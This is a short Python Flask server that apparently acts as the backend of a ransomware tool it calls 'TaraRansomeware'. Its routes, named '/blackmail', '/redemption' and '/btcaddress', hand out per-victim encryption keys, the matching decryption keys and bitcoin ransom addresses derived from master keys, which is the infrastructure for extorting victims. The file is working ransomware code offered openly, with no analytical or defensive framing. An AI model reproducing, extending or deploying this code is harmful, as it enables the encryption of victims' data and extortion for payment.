from flask import Flask, request

from key import KeyDerivationFactory
from utils import ctime, read_master_bitcoin_public_key, read_master_cipher_private_key, read_master_cipher_public_key

app = Flask(__name__)


def getFactory(request):
    guid = request.form['guid']
    print(ctime(), guid)
    return KeyDerivationFactory(guid)


master_cipher_private = read_master_cipher_private_key()
master_cipher_public = read_master_cipher_public_key()
master_bitcoin_public = read_master_bitcoin_public_key()


@app.route('/')
def hello_world():
    return 'Hello, TaraRansomeware!'


@app.route('/blackmail', methods=['POST'])
def trap():
    return getFactory(request).get_cipher_public_key(master_cipher_public)


@app.route('/redemption', methods=['POST'])
def redemption():
    return getFactory(request).get_cipher_private_key(master_cipher_private)


@app.route('/btcaddress', methods=['POST'])
def btcaddress():
    return getFactory(request).get_bitcoin_address(master_bitcoin_public)


if __name__ == "__main__":
    app.run(port=8080)
